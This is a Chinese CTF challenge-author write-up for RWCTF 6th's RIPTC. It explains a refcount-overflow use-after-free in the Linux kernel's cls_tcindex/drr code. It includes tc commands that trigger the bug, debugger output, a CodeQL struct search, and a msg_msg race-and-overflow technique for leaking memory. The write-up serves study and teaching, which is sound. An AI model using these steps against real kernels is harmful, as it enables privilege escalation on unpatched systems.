---
layout: post
title: "RWCTF 6th RIPTC Write-up zh-CN"
---

# 0x00 出题背景

某日瞥见[Breaking the Code - Exploiting and Examining CVE-2023-1829 in cls_tcindex Classifier Vulnerability](https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/) 这篇文章，讲述了[CVE-2023-1829](https://nvd.nist.gov/vuln/detail/CVE-2023-1829) 漏洞成因及利用方法，对应的[修复方案](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8c710f75256bb3cf05ac7b1672c82b92c43f3d28)是删除整个`cls_tcindex.c`文件。今年`net/sched`攻击面在`kctf/kernelCTF`上大火，引起了安全社区对linux kernel安全的广泛关注，遂以历史遗迹`tcindex` 为切入点，寻找该文件可能存在的其他安全问题，将这场贴身肉搏的经历献给RWCTF的参赛选手们，望乞海涵。

<!-- more -->

对题目感兴趣想先上手把玩的朋友，可以参考RIPTC的题目[描述](https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main/RIPTC)和[附件](https://github.com/chaitin/Real-World-CTF-6th-Challenges/releases/download/x/riptc_attachment_241a4f7b8921b131e3237af987ad4f82.tar.gz)，身临其境体验一番。
# 0x01 漏洞挖掘

有关`tcindex`的知识需要对linux traffic control框架有基本的了解，可参考[lartc文档](https://lartc.org/lartc.pdf)，[tc手册](https://man7.org/linux/man-pages/man8/tc.8.html)，以及[内核源代码](https://elixir.bootlin.com/linux/latest/source/net/sched)。[参考](https://docs.google.com/spreadsheets/d/e/2PACX-1vS1REdTA29OJftst8xN5B5x8iIUcxuK6bXdzF8G1UXCmRtoNsoQ9MbebdRdFnj6qZ0Yd7LwQfvYC2oF/pubhtml)历史漏洞[CVE-2023-3776](https://nvd.nist.gov/vuln/detail/CVE-2023-3776)和[CVE-2023-4206](https://nvd.nist.gov/vuln/detail/CVE-2023-4206)可知，`net/sched/cls_*.c`中常见的安全问题和在change filter过程中的`tcf_bind_filter`调用，以及`struct tcf_result`的处理方式有关。

审计[`net/sched/cls_tcindex.c`](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/sched/cls_tcindex.c?id=bbe77c14ee6185a61ba6d5e435c1cbb489d2a9ed)文件发现，每次change tcindex时，如果原有的`tcindex_data`存在perfect hash table，则会根据传入的[hash参数](https://man7.org/linux/man-pages/man8/tc-tcindex.8.html)（表示hash table size）重新生成一个，并将原有的`tcf_result`内容进行拷贝，但拷贝数量的多少是取传入hash值和原有hash值的最小值，如果传入的hash值更小，则原有的一些`tcf_result`内容将会被直接遗弃：

```c
	if (p->perfect) {
		int i;

		if (tcindex_alloc_perfect_hash(net, cp) < 0)
			goto errout;
		cp->alloc_hash = cp->hash;
		for (i = 0; i < min(cp->hash, p->hash); i++)
			cp->perfect[i].res = p->perfect[i].res;
		balloc = 1;
	}
```

同时，在释放原有的`tcindex_data`过程中，也没有对`cp->perfect[i].res`做额外的`tcf_unbind_filter`操作：

```c
static void tcindex_partial_destroy_work(struct work_struct *work)
{
	struct tcindex_data *p = container_of(to_rcu_work(work),
					      struct tcindex_data,
					      rwork);

	rtnl_lock();
	if (p->perfect)
		tcindex_free_perfect_hash(p);
	kfree(p);
	rtnl_unlock();
}

static void tcindex_free_perfect_hash(struct tcindex_data *cp)
{
	int i;

	for (i = 0; i < cp->hash; i++)
		tcf_exts_destroy(&cp->perfect[i].exts);
	kfree(cp->perfect);
}
```

配合tcindex的`classid`参数，则可对某个`class`多次进行`tcf_bind_filter`操作，导致bind和unbind的次数不匹配：

```c
	if (tb[TCA_TCINDEX_CLASSID]) {
		cr.classid = nla_get_u32(tb[TCA_TCINDEX_CLASSID]);
		tcf_bind_filter(tp, &cr, base);
	}

	oldp = p;
	r->res = cr;
	tcf_exts_change(&r->exts, &e);

	rcu_assign_pointer(tp->root, cp);
```

以`drr_class`为例子，对某个class bind一次则`cl->filter_cnt++`，class地址和classid被保存至`p->perfect[i].res`，因为对tcindex的change操作，导致`res`内容被遗弃，再次重复前文步骤则可导致该class的引用计数`filter_cnt`多次增加。当最后一次bind使其溢出回环至0时，删除释放对应class，而在`res`中仍有对该class的引用，传入数据包触发`tcindex_classify`后即可对该class造成UAF。

```c
struct drr_class {
	struct Qdisc_class_common	common;
	unsigned int			filter_cnt;

	struct gnet_stats_basic_sync		bstats;
	struct gnet_stats_queue		qstats;
	struct net_rate_estimator __rcu *rate_est;
	struct list_head		alist;
	struct Qdisc			*qdisc;

	u32				quantum;
	u32				deficit;
};

static int drr_delete_class(struct Qdisc *sch, unsigned long arg,
			    struct netlink_ext_ack *extack)
{
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl = (struct drr_class *)arg;

	if (cl->filter_cnt > 0)
		return -EBUSY;

	sch_tree_lock(sch);

	qdisc_purge_queue(cl->qdisc);
	qdisc_class_hash_remove(&q->clhash, &cl->common);

	sch_tree_unlock(sch);

	drr_destroy_class(sch, cl);
	return 0;
}

static unsigned long drr_bind_tcf(struct Qdisc *sch, unsigned long parent,
				  u32 classid)
{
	struct drr_class *cl = drr_find_class(sch, classid);

	if (cl != NULL)
		cl->filter_cnt++;

	return (unsigned long)cl;
}

static void drr_unbind_tcf(struct Qdisc *sch, unsigned long arg)
{
	struct drr_class *cl = (struct drr_class *)arg;

	cl->filter_cnt--;
}

static const struct Qdisc_class_ops drr_class_ops = {
	.change		= drr_change_class,
	.delete		= drr_delete_class,
	.find		= drr_search_class,
	.tcf_block	= drr_tcf_block,
	.bind_tcf	= drr_bind_tcf,
	.unbind_tcf	= drr_unbind_tcf,
	.graft		= drr_graft_class,
	.leaf		= drr_class_leaf,
	.qlen_notify	= drr_qlen_notify,
	.dump		= drr_dump_class,
	.dump_stats	= drr_dump_class_stats,
	.walk		= drr_walk,
};
```

你可能会问对同一个class多次bind行不行，因为每次filter bind都会对之前的class进行一次unbind，相当于每个tcindex filter只能bind一次同一个class。至于创建超级多个filter去bind同一个class，内核内存自然也是经受不住的：

```c
static inline void
__tcf_bind_filter(struct Qdisc *q, struct tcf_result *r, unsigned long base)
{
	unsigned long cl;

	cl = q->ops->cl_ops->bind_tcf(q, base, r->classid);
	cl = __cls_set_class(&r->class, cl);
	if (cl)
		q->ops->cl_ops->unbind_tcf(q, cl);
}
```

综上，可以编译个本地环境使用静态编译的[tc](https://github.com/iproute2/iproute2/tree/main/tc)文件，对同一个drr_class bind两次：

```
/ # ./tc qdisc add dev lo handle 1 root drr
/ # ./tc class add dev lo parent 1: classid 1:1 drr
/ # ./tc filter add dev lo parent 1: handle 9 prio 1 tcindex hash 16 mask 15 classid 1:1
/ # ./tc -s filter show dev lo
filter parent 1: protocol all pref 1 tcindex chain 0 
filter parent 1: protocol all pref 1 tcindex chain 0 handle 0x0009 classid 1:1 
/ # ./tc filter replace dev lo parent 1: prio 1 tcindex hash 8 mask 7
/ # ./tc -s filter show dev lo
filter parent 1: protocol all pref 1 tcindex chain 0 
/ # ./tc filter replace dev lo parent 1: handle 9 prio 1 tcindex hash 16 mask 15 classid 1:1
/ # ./tc -s filter show dev lo
filter parent 1: protocol all pref 1 tcindex chain 0 
filter parent 1: protocol all pref 1 tcindex chain 0 handle 0x0009 classid 1:1 
/ # ./tc filter replace dev lo parent 1: prio 1 tcindex hash 8 mask 7
/ # ./tc -s filter show dev lo
filter parent 1: protocol all pref 1 tcindex chain 0 
```

```
gef➤  p *(struct drr_class *)arg
$1 = {
  common = {
    classid = 0x10001,
    hnode = {
      next = 0x0 <fixed_percpu_data>,
      pprev = 0xffff8880058142c8
    }
  },
  filter_cnt = 0x2,
```
# 0x02 环境搭建

如果要将这个引用计数整数溢出导致的UAF漏洞转化成真实的漏洞利用场景，首当其冲的是触发漏洞的时间长短问题，比如类似问题的[CVE-2016-0728](https://web.archive.org/web/20160122103500/http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/)有较短的触发路径，在Intel Core i7-5500 CPU上跑了半小时，类似路径场景的[Issue 1423266](https://bugs.chromium.org/p/chromium/issues/detail?id=1423266)跑20bit都要花费至少一小时，我本地测试20bit需要跑3分钟，考虑到比赛时利用的时长和调试的方便程度，决定将`drr_class`的`filter_cnt`patch为16bit。

```c
struct drr_class {
        struct Qdisc_class_common       common;
        unsigned int                    filter_cnt:16;

        struct gnet_stats_basic_sync            bstats;
        struct gnet_stats_queue         qstats;
        struct net_rate_estimator __rcu *rate_est;
        struct list_head                alist;
        struct Qdisc                    *qdisc;

        u32                             quantum;
        u32                             deficit;
};
```

但是如果将该patch直接以源码的形式发放给参赛选手，则会瞬间暴露因patch引入的引用计数问题，转而直接去调用tcindex劫持执行流，无法引导大家去挖掘前文的漏洞了，所以我选择将patch以vmlinux的形式进行体现，增强选手对整体内核环境的理解。当然，联系发现的漏洞利用场景和题目描述，可根据提供的`.config`编译vmlinux，快速bindiff出patch点：

![](https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/ee2fecafly1hme18lb0kmj21ws0g6gs0.jpg)

因为要引入被删除的`cls_tcindex.c`文件，这里选择[6.1.72](https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.1.72.tar.xz)内核版本源码，反向引入patch：

```bash
wget https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/patch/?id=b93aeb6352b0229e3c5ca5ca4ff015b015aff33c -O rsvp.patch
patch -p1 -R < rsvp.patch
wget https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/patch/?id=3abebc503a5148072052c229c6b04b329a420ecd -O tcindex.patch
patch -p1 -R < tcindex.patch
wget https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=97e3d26b5e5f371b3ee223d94dd123e6c442ba80 -O CPU-entry-area.patch
patch -p1 < CPU-entry-area.patch
```

关于`.config`文件和运行环境，参考kernelCTF的相关[build](https://github.com/google/security-research/blob/master/kernelctf/build_release.sh)和[本地运行](https://github.com/google/security-research/blob/master/kernelctf/simulator/local_runner.sh)脚本，对于内核的安全机制应开尽开，关闭了`CONFIG_IO_URING`、`CONFIG_NETFILTER`、`CONFIG_NET_CLS_ACT`（间接disable CVE-2023-1829的[原始问题](https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/#vulnerability-analysis)）和多余的`CONFIG_NET_CLS_*`，以及[modprobe_path](https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md)和[cpu_entry_area](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3776_lts/docs/exploit.md#put-payload-in-fixed-kernel-address-cve-2023-0597)的trick。最后因为有部分的tc利用代码可[参考](https://github.com/star-sg/CVE/blob/master/CVE-2023-1829/src/cls.c)，将[nsjail](https://github.com/google/nsjail)的`time_limit`调整为120秒，顺便考验一下大家的编程能力。

# 0x03 利用方案

## primitive

将漏洞场景抽象下，就是可以多次对`drr_class`这个kmalloc-128 object进行UAF。在内核代码上下文中，首先可知有个任意地址call的原语，[`drr_enqueue`](https://elixir.bootlin.com/linux/v6.1.72/source/net/sched/sch_drr.c#L331) -> [`drr_classify`](https://elixir.bootlin.com/linux/v6.1.72/source/net/sched/sch_drr.c#L293) 获取到free后的drr_class对象，即通过`skb->tc_index` 指定对应的res中的class地址：

```c
static int tcindex_classify(struct sk_buff *skb, const struct tcf_proto *tp,
			    struct tcf_result *res)
{
	struct tcindex_data *p = rcu_dereference_bh(tp->root);
	struct tcindex_filter_result *f;
	int key = (skb->tc_index & p->mask) >> p->shift;

	pr_debug("tcindex_classify(skb %p,tp %p,res %p),p %p\n",
		 skb, tp, res, p);

	f = tcindex_lookup(p, key);
	if (!f) {
		struct Qdisc *q = tcf_block_q(tp->chain->block);

		if (!p->fall_through)
			return -1;
		res->classid = TC_H_MAKE(TC_H_MAJ(q->handle), key);
		res->class = 0;
		pr_debug("alg 0x%x\n", res->classid);
		return 0;
	}
	*res = f->res;
	pr_debug("map 0x%x\n", res->classid);

	return tcf_exts_exec(skb, &f->exts, res);
}
```

随后的`qdisc_enqueue` 即会调用`cl->qdisc->enqueue` ，只要`cl`两层引用后的内容可控，就能劫持执行流去做ROP：

```c
static int drr_enqueue(struct sk_buff *skb, struct Qdisc *sch,
		       struct sk_buff **to_free)
{
	unsigned int len = qdisc_pkt_len(skb);
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl;
	int err = 0;
	bool first;

	cl = drr_classify(skb, sch, &err);
	if (cl == NULL) {
		if (err & __NET_XMIT_BYPASS)
			qdisc_qstats_drop(sch);
		__qdisc_drop(skb, to_free);
		return err;
	}

	first = !cl->qdisc->q.qlen;
	err = qdisc_enqueue(skb, cl->qdisc, to_free);
	if (unlikely(err != NET_XMIT_SUCCESS)) {
		if (net_xmit_drop_count(err)) {
			cl->qstats.drops++;
			qdisc_qstats_drop(sch);
		}
		return err;
	}
```

```c
static inline int qdisc_enqueue(struct sk_buff *skb, struct Qdisc *sch,
				struct sk_buff **to_free)
{
	qdisc_calculate_pkt_len(skb, sch);
	return sch->enqueue(skb, sch, to_free);
}
```

大多数的kernelCTF和TC相关的writeup都没有提及`tcf_unbind_filter`相关的原语，在free掉drr_class对象后，在`sch_drr.c`中基本上找不到直接相关的原语了，还是得和res挂上钩，转到`cls_tcindex.c`中仅有的只是`tcf_unbind_filter` 操作了（有好几条路径可达如delete等）：

```c
static inline void
__tcf_unbind_filter(struct Qdisc *q, struct tcf_result *r)
{
	unsigned long cl;

	if ((cl = __cls_set_class(&r->class, 0)) != 0)
		q->ops->cl_ops->unbind_tcf(q, cl);
}

static inline void
tcf_unbind_filter(struct tcf_proto *tp, struct tcf_result *r)
{
	struct Qdisc *q = tp->chain->block->q;

	if (!q)
		return;
	__tcf_unbind_filter(q, r);
}
```

```c
static void drr_unbind_tcf(struct Qdisc *sch, unsigned long arg)
{
	struct drr_class *cl = (struct drr_class *)arg;

	cl->filter_cnt--;
}
```

在`tcindex_delete` -> `tcf_unbind_filter` -> `drr_unbind_tcf`流转后，偏移24处的filter_cnt会减去1：

```
gef➤  ptype /o struct drr_class
/* offset      |    size */  type = struct drr_class {
/*      0      |      24 */    struct Qdisc_class_common {
/*      0      |       4 */        u32 classid;
/* XXX  4-byte hole      */
/*      8      |      16 */        struct hlist_node {
/*      8      |       8 */            struct hlist_node *next;
/*     16      |       8 */            struct hlist_node **pprev;

                                       /* total size (bytes):   16 */
                                   } hnode;

                                   /* total size (bytes):   24 */
                               } common;
/*     24: 0   |       4 */    unsigned int filter_cnt : 16;
/* XXX  6-byte hole      */
/*     32      |      16 */    struct gnet_stats_basic_sync {
/*     32      |       8 */        u64_stats_t bytes;
/*     40      |       8 */        u64_stats_t packets;
/*     48      |       0 */        struct u64_stats_sync {
                                       <no data fields>

                                       /* total size (bytes):    0 */
                                   } syncp;

                                   /* total size (bytes):   16 */
                               } bstats;
/*     48      |      20 */    struct gnet_stats_queue {
/*     48      |       4 */        __u32 qlen;
/*     52      |       4 */        __u32 backlog;
/*     56      |       4 */        __u32 drops;
/*     60      |       4 */        __u32 requeues;
/*     64      |       4 */        __u32 overlimits;

                                   /* total size (bytes):   20 */
                               } qstats;
/* XXX  4-byte hole      */
/*     72      |       8 */    struct net_rate_estimator *rate_est;
/*     80      |      16 */    struct list_head {
/*     80      |       8 */        struct list_head *next;
/*     88      |       8 */        struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } alist;
/*     96      |       8 */    struct Qdisc *qdisc;
/*    104      |       4 */    u32 quantum;
/*    108      |       4 */    u32 deficit;

                               /* total size (bytes):  112 */
                             }
```

因为最后时刻可以多次绑定同一个class至不同的`res`，所以在重新占位后可多次进行unbind减一操作，修改object中的关键字段，如在[cve-2021-22555](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#exploitation)考虑到的Reference counter和Pointer in a struct，但是[常见结构体](https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/)中符合kmalloc-128的subprocess_info已[不再可用](https://www.willsroot.io/2021/10/pbctf-2021-nightclub-writeup-more-fun.html)，需要考虑其他[弹性结构体](https://zplin.me/papers/ELOISE.pdf)。又或者是修改诸如size的字段至负数，可能会造成信息泄漏，这里使用CodeQL借鉴[@veritas501](https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/)和[@nccgroup](https://research.nccgroup.com/2023/05/23/offensivecon-2023-exploit-engineering-attacking-the-linux-kernel/)的编写思路，查看在偏移24处有用的字段和结构体：

```
/**
 * This is an automatically generated file
 * @name Hello world
 * @kind problem
 * @problem.severity warning
 * @id cpp/example/hello-world
 */

 import cpp

 from FunctionCall fc, Function f, Type typ, Field field
 where
   f = fc.getTarget() and
   f.getName().regexpMatch("k[a-z]*alloc") and
   typ = fc.getActualType().(PointerType).getBaseType() and
   field.getDeclaringType() = typ and
   field.getByteOffset() = 24 and
   not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch("arch.*") and 
   not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch("drivers.*") 
 select fc, "In $@, $@ called once $@ with struct $@ filed $@ at offset 24",
 fc,fc.getEnclosingFunction().getFile().getRelativePath(), fc.getEnclosingFunction(),
   fc.getEnclosingFunction().getName().toString(), fc, f.getName(), typ,
   typ.getName(), field, field.getName()
```

可发现我们在利用中比较常见的[simple_xattr](https://www.starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/#searching-for-kernel-structs)和[msg_msg](https://syst3mfailure.io/wall-of-perdition/)：

![](https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/ee2fecafly1hme18sa148j219o0aktdl.jpg)

![](https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/ee2fecafly1hme18w73exj219708zgpj.jpg)

## msg_msg overflow

顺着修改size字段去信息泄漏的思路，如果是对于simple_xattr，原size大小在memcpy之前就会和目的buffer size做比较，如果减至负数则肯定直接返回错误，而且getxattr系统调用对于buffer size的大小也有[XATTR_SIZE_MAX](https://elixir.bootlin.com/linux/v6.1.72/source/fs/xattr.c#L693)的限制：

```c
/*
 * xattr GET operation for in-memory/pseudo filesystems
 */
int simple_xattr_get(struct simple_xattrs *xattrs, const char *name,
		     void *buffer, size_t size)
{
	struct simple_xattr *xattr;
	int ret = -ENODATA;

	spin_lock(&xattrs->lock);
	list_for_each_entry(xattr, &xattrs->head, list) {
		if (strcmp(name, xattr->name))
			continue;

		ret = xattr->size;
		if (buffer) {
			if (size < xattr->size)
				ret = -ERANGE;
			else
				memcpy(buffer, xattr->value, xattr->size);
		}
		break;
	}
	spin_unlock(&xattrs->lock);
	return ret;
}
```

对于我们熟悉的msg_msg，同样存在相同的检查逻辑，毕竟是为了防止一切可能的溢出：

```c
struct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)
{
	struct msg_msgseg *dst_pseg, *src_pseg;
	size_t len = src->m_ts;
	size_t alen;

	if (src->m_ts > dst->m_ts)
		return ERR_PTR(-EINVAL);

	alen = min(len, DATALEN_MSG);
	memcpy(dst + 1, src + 1, alen);

	for (dst_pseg = dst->next, src_pseg = src->next;
	     src_pseg != NULL;
	     dst_pseg = dst_pseg->next, src_pseg = src_pseg->next) {

		len -= alen;
		alen = min(len, DATALEN_SEG);
		memcpy(dst_pseg + 1, src_pseg + 1, alen);
	}

	dst->m_type = src->m_type;
	dst->m_ts = src->m_ts;

	return dst;
}
```

如果说不走`MSG_COPY`路径，带上`MSG_NOERROR`的flag，最终进入store_msg函数，过长的[msgsz](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msg.c#L1034)在[copy_to_user](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msgutil.c#L156)时也会因为[CONFIG_HARDENED_USERCOPY](https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022)而失败。再次回到[copy_msg](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msgutil.c#L124)的代码片段，虽然对于`src->m_ts`的检查使用有TOCTOU的味道，但是这期间的时间窗口实在是太短了无法利用。

那怎么样才能过`if (src->m_ts > dst->m_ts)`的检查呢，洗个澡就想出来了XD。我们可以去修改递减`dst->m_ts`为负数，如果本来`src->m_ts`就大于`dst->m_ts`，那么过掉检查和[memcpy](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msgutil.c#L128)之后，较大的src msg_msg内容复制到较小的dst msg_msg内容，即可overflow至dst msg_msg后面的object对象！如果该object依旧是个msg_msg，那么溢出修改其m_ts字段，即可顺利达到我们想要根据size进行[leak](https://syst3mfailure.io/wall-of-perdition/)的需求。

![](https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/ee2fecafly1hme18zhgf0j20g10c1myb.jpg)

别高兴得太早，这个dst的msg_msg是从哪里来的呢，让我们聚焦到[do_msgrcv](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msg.c#L1098)函数，其首先根据MSG_COPY调用prepare_copy函数生成一个新的msg_msg，注意在其load_msg成功后会立即设置`copy->m_ts`为合适的接收的bufsz：

```c
/*
 * This function creates new kernel message structure, large enough to store
 * bufsz message bytes.
 */
static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)
{
	struct msg_msg *copy;

	/*
	 * Create dummy message to copy real message to.
	 */
	copy = load_msg(buf, bufsz);
	if (!IS_ERR(copy))
		copy->m_ts = bufsz;
	return copy;
}
```

然后在find_msg找到要rcv的msg_msg后即会立即调用copy_msg函数，src为find到的msg_msg，dst为新生成的msg_msg，因为要通过`tcf_unbind_filter`操作递减`dst->m_ts`，所以这里仍然存在一个从prepare_copy设置m_ts到copy_msg判断的时间窗口：

```c
static long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,
	       long (*msg_handler)(void __user *, struct msg_msg *, size_t))
{
	int mode;
	struct msg_queue *msq;
	struct ipc_namespace *ns;
	struct msg_msg *msg, *copy = NULL;
	DEFINE_WAKE_Q(wake_q);

	ns = current->nsproxy->ipc_ns;

	if (msqid < 0 || (long) bufsz < 0)
		return -EINVAL;

	if (msgflg & MSG_COPY) {
		if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))                // [3]
			return -EINVAL;
		copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax));
		if (IS_ERR(copy))
			return PTR_ERR(copy);
	}
	mode = convert_mode(&msgtyp, msgflg);

	rcu_read_lock();
	msq = msq_obtain_object_check(ns, msqid);
	if (IS_ERR(msq)) {
		rcu_read_unlock();
		free_copy(copy);
		return PTR_ERR(msq);
	}

	for (;;) {
		struct msg_receiver msr_d;

		msg = ERR_PTR(-EACCES);
		if (ipcperms(ns, &msq->q_perm, S_IRUGO))
			goto out_unlock1;

		ipc_lock_object(&msq->q_perm);                                      // [4]

		/* raced with RMID? */
		if (!ipc_valid_object(&msq->q_perm)) {
			msg = ERR_PTR(-EIDRM);
			goto out_unlock0;
		}

		msg = find_msg(msq, &msgtyp, mode);                                 // [5]
		if (!IS_ERR(msg)) {
			/*
			 * Found a suitable message.
			 * Unlink it from the queue.
			 */
			if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {
				msg = ERR_PTR(-E2BIG);
				goto out_unlock0;
			}
			/*
			 * If we are copying, then do not unlink message and do
			 * not update queue parameters.
			 */
			if (msgflg & MSG_COPY) {
				msg = copy_msg(msg, copy);
				goto out_unlock0;
			}

			list_del(&msg->m_list);
			msq->q_qnum--;
			msq->q_rtime = ktime_get_real_seconds();
			ipc_update_pid(&msq->q_lrpid, task_tgid(current));
			msq->q_cbytes -= msg->m_ts;
			percpu_counter_sub_local(&ns->percpu_msg_bytes, msg->m_ts);
			percpu_counter_sub_local(&ns->percpu_msg_hdrs, 1);
			ss_wakeup(msq, &wake_q, false);

			goto out_unlock0;
		}

		/* No message waiting. Wait for a message */
		if (msgflg & IPC_NOWAIT) {                                          // [1]
			msg = ERR_PTR(-ENOMSG);
			goto out_unlock0;
		}

		list_add_tail(&msr_d.r_list, &msq->q_receivers);
		msr_d.r_tsk = current;
		msr_d.r_msgtype = msgtyp;
		msr_d.r_mode = mode;
		if (msgflg & MSG_NOERROR)
			msr_d.r_maxsize = INT_MAX;
		else
			msr_d.r_maxsize = bufsz;

		/* memory barrier not require due to ipc_lock_object() */
		WRITE_ONCE(msr_d.r_msg, ERR_PTR(-EAGAIN));

		/* memory barrier not required, we own ipc_lock_object() */
		__set_current_state(TASK_INTERRUPTIBLE);

		ipc_unlock_object(&msq->q_perm);
		rcu_read_unlock();
		schedule();                                                         // [2]

		/*
		 * Lockless receive, part 1:
		 * We don't hold a reference to the queue and getting a
		 * reference would defeat the idea of a lockless operation,
		 * thus the code relies on rcu to guarantee the existence of
		 * msq:
		 * Prior to destruction, expunge_all(-EIRDM) changes r_msg.
		 * Thus if r_msg is -EAGAIN, then the queue not yet destroyed.
		 */
		rcu_read_lock();

		/*
		 * Lockless receive, part 2:
		 * The work in pipelined_send() and expunge_all():
		 * - Set pointer to message
		 * - Queue the receiver task for later wakeup
		 * - Wake up the process after the lock is dropped.
		 *
		 * Should the process wake up before this wakeup (due to a
		 * signal) it will either see the message and continue ...
		 */
		msg = READ_ONCE(msr_d.r_msg);
		if (msg != ERR_PTR(-EAGAIN)) {
			/* see MSG_BARRIER for purpose/pairing */
			smp_acquire__after_ctrl_dep();

			goto out_unlock1;
		}

		 /*
		  * ... or see -EAGAIN, acquire the lock to check the message
		  * again.
		  */
		ipc_lock_object(&msq->q_perm);

		msg = READ_ONCE(msr_d.r_msg);
		if (msg != ERR_PTR(-EAGAIN))
			goto out_unlock0;

		list_del(&msr_d.r_list);
		if (signal_pending(current)) {
			msg = ERR_PTR(-ERESTARTNOHAND);
			goto out_unlock0;
		}

		ipc_unlock_object(&msq->q_perm);
	}

out_unlock0:
	ipc_unlock_object(&msq->q_perm);
	wake_up_q(&wake_q);
out_unlock1:
	rcu_read_unlock();
	if (IS_ERR(msg)) {
		free_copy(copy);
		return PTR_ERR(msg);
	}

	bufsz = msg_handler(buf, msg, bufsz);
	free_msg(msg);

	return bufsz;
}
```

纵观do_msgrcv的代码，想要扩充这个时间窗口：
1. 首先可设置IPC_NOWAIT flag \[1\]，假如msg queue中不存在对应所需要的msg_msg则进入schedule \[2\]，但是IPC_NOWAIT不能和MSG_COPY同时设置 \[3\]，这条路堵死了。
2. 借鉴[@Jann Horn](https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf)的条件竞争思路，在ipc_lock_object \[4\]处，使用[msgctl_stat](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msg.c#L554)竞争抢占该spinlock，但相关系统调用都存在进入系统调用和copy_to_user的时间消耗，总体效果不佳。
3. 逐行审计代码含义，发现find_msg \[5\]有个有趣的循环，如果设置MSG_COPY则[搜索模式](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msg.c#L1004)为SEARCH_NUMBER，即我们msg_queue中有多少个msg_msg，最多就可以循环多少次进行查找：

```c
static struct msg_msg *find_msg(struct msg_queue *msq, long *msgtyp, int mode)
{
	struct msg_msg *msg, *found = NULL;
	long count = 0;

	list_for_each_entry(msg, &msq->q_messages, m_list) {
		if (testmsg(msg, *msgtyp, mode) &&
		    !security_msg_queue_msgrcv(&msq->q_perm, msg, current,
					       *msgtyp, mode)) {
			if (mode == SEARCH_LESSEQUAL && msg->m_type != 1) {
				*msgtyp = msg->m_type - 1;
				found = msg;
			} else if (mode == SEARCH_NUMBER) {
				if (*msgtyp == count)
					return msg;
			} else
				return msg;
			count++;
		}
	}

	return found ?: ERR_PTR(-EAGAIN);
}
```

类似的，在`tcindex_destroy`中，也有一个循环去做`tcf_unbind_filter`减1的操作：

```c
static void tcindex_destroy(struct tcf_proto *tp, bool rtnl_held,
			    struct netlink_ext_ack *extack)
{
	struct tcindex_data *p = rtnl_dereference(tp->root);
	int i;

	pr_debug("tcindex_destroy(tp %p),p %p\n", tp, p);

	if (p->perfect) {
		for (i = 0; i < p->hash; i++) {
			struct tcindex_filter_result *r = p->perfect + i;

			/* tcf_queue_work() does not guarantee the ordering we
			 * want, so we have to take this refcnt temporarily to
			 * ensure 'p' is freed after all tcindex_filter_result
			 * here. Imperfect hash does not need this, because it
			 * uses linked lists rather than an array.
			 */
			tcindex_data_get(p);

			tcf_unbind_filter(tp, &r->res);
			if (tcf_exts_get_net(&r->exts))
				tcf_queue_work(&r->rwork,
					       tcindex_destroy_rexts_work);
			else
				__tcindex_destroy_rexts(r);
		}
	}

	for (i = 0; p->h && i < p->hash; i++) {
		struct tcindex_filter *f, *next;
		bool last;

		for (f = rtnl_dereference(p->h[i]); f; f = next) {
			next = rtnl_dereference(f->next);
			tcindex_delete(tp, &f->result, &last, rtnl_held, NULL);
		}
	}

	tcf_queue_work(&p->rwork, tcindex_destroy_work);
}
```

因为msg_msg的头部占0x30字节，msg_msg的内容得大于0x30才能分配到kmalloc-cg-128，如0x40的大小只需要0x41次unbind即可使`dst->m_ts`为负数，将find_msg的循环设置为0x2000甚至是更大，这样就很轻松完成该条件竞争，overflow相邻msg_msg了：

![](https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/ee2fecafly1hme192peuyj20oj0kkdga.jpg)

